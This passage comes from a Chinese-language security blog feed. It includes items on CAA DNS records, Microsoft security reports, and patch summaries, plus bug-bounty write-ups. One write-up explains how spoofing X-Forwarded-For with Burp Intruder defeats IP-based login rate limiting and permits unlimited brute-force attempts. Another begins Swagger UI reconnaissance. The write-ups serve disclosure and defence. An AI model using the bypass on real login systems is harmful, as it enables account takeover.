&lt;h3 id=&#34;勘误&#34;&gt;勘误
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;奥卢大学位于芬兰&lt;/li&gt;
&lt;li&gt;威斯康星大学在1988年就布置了模糊测试作业&lt;/li&gt;
&lt;li&gt;SV-Comp用于软件验证，也存在机器学习竞赛&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你喜欢这篇文章，请分享至：
[Twitter] [LinkedIn] [GitHub] [Mastodon] [Hacker News]&lt;/p&gt;
</description>
        </item>
        <item>
        <title>如何通过CAA记录限制证书颁发机构(CA)签发SSL证书</title>
        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87caa%E8%AE%B0%E5%BD%95%E9%99%90%E5%88%B6%E8%AF%81%E4%B9%A6%E9%A2%81%E5%8F%91%E6%9C%BA%E6%9E%84ca%E7%AD%BE%E5%8F%91ssl%E8%AF%81%E4%B9%A6/</link>
        <pubDate>Sun, 03 Aug 2025 14:55:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87caa%E8%AE%B0%E5%BD%95%E9%99%90%E5%88%B6%E8%AF%81%E4%B9%A6%E9%A2%81%E5%8F%91%E6%9C%BA%E6%9E%84ca%E7%AD%BE%E5%8F%91ssl%E8%AF%81%E4%B9%A6/</guid>
        <description>&lt;h1 id=&#34;限制证书颁发机构ca签发ssl证书启用dns中的caa记录&#34;&gt;限制证书颁发机构(CA)签发SSL证书：启用DNS中的CAA记录
&lt;/h1&gt;&lt;h2 id=&#34;什么是caa&#34;&gt;什么是CAA？
&lt;/h2&gt;&lt;p&gt;CAA（证书颁发机构授权）是一种DNS记录类型，用于指定哪些证书颁发机构(CA)有权为特定域名签发证书。该记录通过公开可查的DNS记录声明，CA在颁发证书前必须进行验证。&lt;/p&gt;
&lt;h2 id=&#34;背景知识&#34;&gt;背景知识
&lt;/h2&gt;&lt;p&gt;虽然CAA的首个草案由Phillip Hallem-Baker和Rob Stradling在2010年提出，但过去5年由于CA相关问题和黑客攻击频发而加速发展。历史上首次CA违规事件发生在2001年，VeriSign向冒充微软代表的个人颁发了名为&amp;quot;Microsoft Corporation&amp;quot;的证书。2011年，Comodo和DigiNotar在被伊朗黑客攻击后签发欺诈证书。2012年Trustwave签发用于SSL流量嗅探的子根证书。&lt;/p&gt;
&lt;h2 id=&#34;未配置caa记录的风险&#34;&gt;未配置CAA记录的风险
&lt;/h2&gt;&lt;p&gt;若未配置CAA记录，任何CA都可为您的域名签发证书。CAA记录相当于在域名级别对CA进行白名单限制。根据现行规范，CA必须查询域名的CAA记录，仅当无记录或CA在白名单中时才能签发证书。&lt;/p&gt;
&lt;h2 id=&#34;caa记录语法格式&#34;&gt;CAA记录语法格式
&lt;/h2&gt;&lt;p&gt;CAA记录格式为：&lt;code&gt;&amp;lt;flag&amp;gt; &amp;lt;tag&amp;gt; &amp;lt;value&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;flag&lt;/strong&gt;：整数标志(1-255)，目前用于关键标志&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;value&lt;/strong&gt;：标签定义的属性值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主要标签说明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;iodef&lt;/code&gt;：指定违规报告方式(mailto/http/https)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;dns软件支持情况&#34;&gt;DNS软件支持情况
&lt;/h2&gt;&lt;p&gt;支持CAA记录的DNS软件包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BIND(9.10.1B及以上)&lt;/li&gt;
&lt;li&gt;Knot DNS(2.2.0及以上)&lt;/li&gt;
&lt;li&gt;PowerDNS(4.0.0及以上)&lt;/li&gt;
&lt;li&gt;Windows Server 2016等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主流DNS服务商如Amazon Route 53、Cloudflare、Google Cloud DNS也提供支持。&lt;/p&gt;
&lt;h2 id=&#34;实际配置示例&#34;&gt;实际配置示例
&lt;/h2&gt;&lt;p&gt;作者网站配置示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0 iodef &amp;#34;mailto:[email protected]&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;互联网现状&#34;&gt;互联网现状
&lt;/h2&gt;&lt;p&gt;审计发现Alexa Top 10,000网站中仅4%配置了CAA记录，网络安全措施仍有很大提升空间。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Comodo CA攻击事件&lt;/li&gt;
&lt;li&gt;DigiNotar攻击事件&lt;/li&gt;
&lt;li&gt;Trustwave子根证书事件&lt;/li&gt;
&lt;li&gt;CAA强制检查规范(Ballot 187)&lt;/li&gt;
&lt;li&gt;IETF RFC 6844标准&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>微软安全情报报告第14版：实时防护效果深度解析</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E6%83%85%E6%8A%A5%E6%8A%A5%E5%91%8A%E7%AC%AC14%E7%89%88%E5%AE%9E%E6%97%B6%E9%98%B2%E6%8A%A4%E6%95%88%E6%9E%9C%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 14:38:57 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E6%83%85%E6%8A%A5%E6%8A%A5%E5%91%8A%E7%AC%AC14%E7%89%88%E5%AE%9E%E6%97%B6%E9%98%B2%E6%8A%A4%E6%95%88%E6%9E%9C%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;实时防护缺失导致感染率激增5倍&#34;&gt;实时防护缺失导致感染率激增5倍
&lt;/h3&gt;&lt;p&gt;2012年下半年数据显示，未启用恶意软件防护产品实时保护功能的计算机，其感染恶意软件和垃圾软件的概率是受保护设备的&lt;strong&gt;5.5倍&lt;/strong&gt;（图1）。该结论基于微软恶意软件删除工具(MSRT)在用户授权前提下收集的全球6亿台设备数据，通过交叉分析防护状态与感染情况得出。&lt;/p&gt;
&lt;h3 id=&#34;windows-8展现显著防护优势&#34;&gt;Windows 8展现显著防护优势
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;**24%**的计算机未运行有效防护产品或使用过期软件（图2）&lt;/li&gt;
&lt;li&gt;Windows 8设备未防护比例最低（32位8.1%/64位7.0%），归功于内置Windows Defender的自动保护机制（图3）&lt;/li&gt;
&lt;li&gt;相应感染率仅为&lt;strong&gt;0.8%(32位)和0.2%(64位)&lt;/strong&gt;，远低于Windows 7 RTM等旧系统（图4）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;防护失效的三大技术成因&#34;&gt;防护失效的三大技术成因
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;预装安软试用期过期&lt;/strong&gt;（占比最高）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;恶意软件强制禁用安全产品&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用户主动关闭防护&lt;/strong&gt;（性能考量/错误认知）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;防护体系技术建议&#34;&gt;防护体系技术建议
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;保持实时防护产品更新可降低**80%**感染风险&lt;/li&gt;
&lt;li&gt;Windows 8的&lt;strong&gt;安全启动&lt;/strong&gt;机制可阻止rootkit等底层恶意代码加载&lt;/li&gt;
&lt;li&gt;企业应部署具备未防护设备自动保护功能的解决方案&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;技术注解&lt;/strong&gt;：Windows Defender采用动态签名更新和行为监控技术，在检测到设备无有效防护时自动激活，其与UEFI安全启动的协同设计构成Windows 8防护体系的核心架构。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>从429到200：利用X-Overwriting头实现速率限制绕过与漏洞赏金</title>
        <link>http://localhost:1313/p/%E4%BB%8E429%E5%88%B0200%E5%88%A9%E7%94%A8x-overwriting%E5%A4%B4%E5%AE%9E%E7%8E%B0%E9%80%9F%E7%8E%87%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E4%B8%8E%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91/</link>
        <pubDate>Sun, 03 Aug 2025 14:11:57 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BB%8E429%E5%88%B0200%E5%88%A9%E7%94%A8x-overwriting%E5%A4%B4%E5%AE%9E%E7%8E%B0%E9%80%9F%E7%8E%87%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E4%B8%8E%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91/</guid>
        <description>&lt;h1 id=&#34;从429到200利用x-overwriting头实现速率限制绕过与漏洞赏金&#34;&gt;从429到200：利用X-Overwriting头实现速率限制绕过与漏洞赏金
&lt;/h1&gt;&lt;p&gt;Akwaaba！朋友们。在本报告中，我将展示如何绕过某组织匆忙实施的速率限制机制。如果你对我的其他研究感兴趣，可以参考我之前关于《如何绕过Google验证码实现CSRF与XSS链式攻击》的文章，或者关于《Android Intent重定向攻击》的移动端渗透测试文章。&lt;/p&gt;
&lt;h2 id=&#34;速率限制技术解析&#34;&gt;速率限制技术解析
&lt;/h2&gt;&lt;p&gt;速率限制是开发者用来控制用户/系统在特定时间范围内请求次数的技术。在API中，标准响应状态码为429（请求过多），但许多开发者会采用非标准实现。常见实现方式包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于IP地址的限制&lt;/li&gt;
&lt;li&gt;基于电子邮件的限制&lt;/li&gt;
&lt;li&gt;基于设备/会话的限制&lt;/li&gt;
&lt;li&gt;基于地理位置的限制&lt;/li&gt;
&lt;li&gt;端点专用限制等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如微软会在多次错误登录后给予冷却期，而Snapchat则会直接临时锁定账户。&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
&lt;/h2&gt;&lt;p&gt;在某HackerOne项目的测试中，我最初发现其应用存在速率限制缺失问题。在厂商修复后，我重新检测登录端点发现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;5次错误登录触发429状态码&lt;/li&gt;
&lt;li&gt;响应体中包含用户公网IP参数&lt;/li&gt;
&lt;li&gt;确认采用IP基础的计数机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用x-overwriting头绕过&#34;&gt;利用X-Overwriting头绕过
&lt;/h2&gt;&lt;p&gt;为绕过IP限制，除了VPN切换外，更有效的方法是使用下列HTTP覆盖头：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;X-HTTP-Method-Override&lt;/code&gt;：覆盖HTTP方法&lt;/li&gt;
&lt;li&gt;&lt;code&gt;X-Original-URL/X-Rewrite-URL&lt;/code&gt;：URL重写&lt;/li&gt;
&lt;li&gt;&lt;code&gt;X-Forwarded-For&lt;/code&gt;：声明原始客户端IP&lt;/li&gt;
&lt;li&gt;&lt;code&gt;X-Real-IP&lt;/code&gt;：替代IP传递方式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过Burp Suite测试：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;注入&lt;code&gt;X-Forwarded-For: 127.0.0.1&lt;/code&gt;头&lt;/li&gt;
&lt;li&gt;观察到状态码从429变为401&lt;/li&gt;
&lt;li&gt;响应体显示伪造IP与剩余尝试次数&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;自动化暴力破解配置&#34;&gt;自动化暴力破解配置
&lt;/h2&gt;&lt;p&gt;使用Burp Intruder进行自动化攻击：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;采用Sniper攻击模式&lt;/li&gt;
&lt;li&gt;对IP地址某个字节设置数字载荷（1-500）&lt;/li&gt;
&lt;li&gt;每个请求自动变更X-Forwarded-For值&lt;/li&gt;
&lt;li&gt;利用无效IP（如256+字节值）实现无限尝试&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;防护方案建议&#34;&gt;防护方案建议
&lt;/h2&gt;&lt;p&gt;针对IP基础速率限制的防护措施：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;仅信任已知内部代理的X-Forwarded-For头&lt;/li&gt;
&lt;li&gt;优先使用网络层REMOTE_ADDR值&lt;/li&gt;
&lt;li&gt;在应用前置反向代理/WAF（如Cloudflare、AWS WAF）&lt;/li&gt;
&lt;li&gt;实施多因素速率限制策略（IP+会话+行为）&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;特别说明：本文所有技术细节已获得相关厂商授权披露，仅供学习防御技术使用。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;通过Twitter @tinopreter或LinkedIn Clement Osei-Somuah与我交流更多安全研究。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>通过Swagger UI进行钓鱼攻击——利用错误配置获取漏洞赏金</title>
        <link>http://localhost:1313/p/%E9%80%9A%E8%BF%87swagger-ui%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E8%8E%B7%E5%8F%96%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91/</link>
        <pubDate>Sun, 03 Aug 2025 13:55:41 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%80%9A%E8%BF%87swagger-ui%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E8%8E%B7%E5%8F%96%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91/</guid>
        <description>&lt;h1 id=&#34;通过swagger-ui进行钓鱼攻击利用错误配置获取漏洞赏金&#34;&gt;通过Swagger UI进行钓鱼攻击——利用错误配置获取漏洞赏金
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;Swagger UI是一个开源工具，帮助开发者可视化和交互由OpenAPI规范定义的API端点。虽然它对测试和文档非常有用，但暴露或错误配置的Swagger实例可能导致严重的安全问题，如DOM XSS、HTML注入和开放重定向。随着漏洞赏金平台对此类漏洞的奖励，保护Swagger UI不仅至关重要，也是道德黑客的宝贵目标。&lt;/p&gt;
&lt;h2 id=&#34;为什么swagger-ui可能很危险&#34;&gt;为什么Swagger UI可能很危险
&lt;/h2&gt;&lt;p&gt;问题不在于Swagger本身，而在于开发者部署它的方式——有时公开部署，有时包含敏感端点，并且经常没有身份验证和输入清理。常见问题包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在互联网上暴露Swagger UI，包含生产端点。&lt;/li&gt;
&lt;li&gt;文档缺乏访问控制。&lt;/li&gt;
&lt;li&gt;输入清理不当，允许XSS和HTML注入。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;侦察阶段寻找swagger-ui&#34;&gt;侦察阶段——寻找Swagger UI
&lt;/h2&gt;&lt;p&gt;使用Subfinder收集所有子域名。关键技巧如下：&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;subfinder -d example&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;com --all &amp;gt;&amp;gt; subs.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;总是寻找类似&lt;code&gt;grafana.example.com&lt;/code&gt;的子域名，如果你找到这样的子域名，那么你就走运了！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>微软2023年12月安全更新：关键漏洞修复与技术指南</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2023%E5%B9%B412%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%B8%8E%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sun, 03 Aug 2025 13:50:20 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2023%E5%B9%B412%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%B8%8E%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h3 id=&#34;安全更新概要&#34;&gt;安全更新概要
&lt;/h3&gt;&lt;p&gt;2023年12月12日（UTC时间），微软发布月度安全更新，修复影响多款产品的安全漏洞。本次更新涉及：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Windows全系列&lt;/strong&gt;（11/10/Server）：修复远程代码执行漏洞（CVE-2023-20588等）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Microsoft Office&lt;/strong&gt;：信息泄露漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Azure云平台&lt;/strong&gt;：特权提升风险&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;恶意软件防护引擎&lt;/strong&gt;：服务拒绝漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;关键技术细节&#34;&gt;关键技术细节
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;已公开漏洞紧急修复&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AMD推测执行漏洞（CVE-2023-20588）存在野外利用&lt;/li&gt;
&lt;li&gt;Visual Studio编译错误（C2471）通过KB5029365补丁解决&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;更新部署方式&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| 产品系列          | 最高严重性 | 影响范围       | KB编号        |
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|-------------------|------------|----------------|---------------|
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| Windows 11 23H2   | 紧急       | 远程代码执行   | 5033375       |
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| Windows Server 2022 | 紧急    | 服务拒绝       | 5033118       |
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;开发者注意事项&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务堆栈更新(SSU)需参照ADV990001&lt;/li&gt;
&lt;li&gt;安全更新指南API支持自定义报表生成（含GitHub示例代码）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;后续计划&#34;&gt;后续计划
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;下次更新预计2024年1月9日发布&lt;/li&gt;
&lt;li&gt;建议通过安全更新指南订阅RSS或创建通知配置文件&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：Windows Server 2019/2016用户需优先安装5033371/5033373补丁以缓解关键风险。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>2014年4月安全更新风险评估：微软紧急修复11个漏洞</title>
        <link>http://localhost:1313/p/2014%E5%B9%B44%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E5%BE%AE%E8%BD%AF%E7%B4%A7%E6%80%A5%E4%BF%AE%E5%A4%8D11%E4%B8%AA%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sun, 03 Aug 2025 13:28:49 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2014%E5%B9%B44%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E5%BE%AE%E8%BD%AF%E7%B4%A7%E6%80%A5%E4%BF%AE%E5%A4%8D11%E4%B8%AA%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h2 id=&#34;2014年4月安全更新风险评估&#34;&gt;2014年4月安全更新风险评估
&lt;/h2&gt;&lt;p&gt;本日，微软发布了4个安全公告，共修复11个CVE漏洞。其中2个公告评级为&amp;quot;紧急&amp;quot;，2个为&amp;quot;重要&amp;quot;。以下风险评估表可帮助用户确定补丁优先级：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;安全公告&lt;/th&gt;
          &lt;th&gt;最可能攻击方式&lt;/th&gt;
          &lt;th&gt;严重等级&lt;/th&gt;
          &lt;th&gt;漏洞利用指数&lt;/th&gt;
          &lt;th&gt;30天内影响预测&lt;/th&gt;
          &lt;th&gt;平台缓解措施及备注&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;MS14-017(Word)&lt;/td&gt;
          &lt;td&gt;受害者打开RTF或DOC/DOCX文件&lt;/td&gt;
          &lt;td&gt;紧急&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;预计CVE-2014-1761漏洞会持续被利用&lt;/td&gt;
          &lt;td&gt;修复了安全公告2953095中描述的&amp;quot;目标攻击漏洞&amp;quot;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;MS14-018(IE)&lt;/td&gt;
          &lt;td&gt;受害者访问恶意网页&lt;/td&gt;
          &lt;td&gt;紧急&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;30天内可能出现漏洞利用代码&lt;/td&gt;
          &lt;td&gt;-&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;MS14-020(Publisher)&lt;/td&gt;
          &lt;td&gt;受害者打开恶意.PUB文件&lt;/td&gt;
          &lt;td&gt;重要&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;可能快速出现利用代码，但Publisher使用范围有限&lt;/td&gt;
          &lt;td&gt;-&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;MS14-019(Windows文件操作)&lt;/td&gt;
          &lt;td&gt;攻击者在共享网络放置恶意.bat/.cmd文件，诱骗用户执行&lt;/td&gt;
          &lt;td&gt;重要&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;虽可被利用但历史上未见大规模攻击&lt;/td&gt;
          &lt;td&gt;类似DLL预加载攻击向量&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;技术要点：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Word漏洞(CVE-2014-1761)通过特殊格式文档触发&lt;/li&gt;
&lt;li&gt;IE漏洞需要结合恶意网页利用&lt;/li&gt;
&lt;li&gt;Publisher漏洞受限于软件部署范围&lt;/li&gt;
&lt;li&gt;Windows文件操作漏洞需特定执行环境&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;建议用户优先部署MS14-017和MS14-018两个紧急更新。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>IMDSv2强制实施：即将登陆您所在的区域！</title>
        <link>http://localhost:1313/p/imdsv2%E5%BC%BA%E5%88%B6%E5%AE%9E%E6%96%BD%E5%8D%B3%E5%B0%86%E7%99%BB%E9%99%86%E6%82%A8%E6%89%80%E5%9C%A8%E7%9A%84%E5%8C%BA%E5%9F%9F/</link>
        <pubDate>Sun, 03 Aug 2025 13:07:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/imdsv2%E5%BC%BA%E5%88%B6%E5%AE%9E%E6%96%BD%E5%8D%B3%E5%B0%86%E7%99%BB%E9%99%86%E6%82%A8%E6%89%80%E5%9C%A8%E7%9A%84%E5%8C%BA%E5%9F%9F/</guid>
        <description>&lt;h3 id=&#34;imdsv2强制实施即将登陆您所在的区域&#34;&gt;IMDSv2强制实施：即将登陆您所在的区域！
&lt;/h3&gt;&lt;p&gt;3月25日，AWS发布了一项新功能，默认对新启动的EC2实例实施IMDSv2（Instance Metadata Service Version 2）。这项期待已久的功能虽然仍有改进空间，但标志着云安全的重要进步。&lt;/p&gt;
&lt;h4 id=&#34;imdsv2简介&#34;&gt;IMDSv2简介
&lt;/h4&gt;&lt;p&gt;IMDSv2是AWS于2019年11月推出的安全机制，旨在应对Capital One数据泄露事件。该事件由SSRF（服务器端请求伪造）漏洞引发，促使美国参议员致信AWS询问防护措施。IMDSv2能有效防止攻击者通过SSRF漏洞从实例元数据服务窃取凭证。&lt;/p&gt;
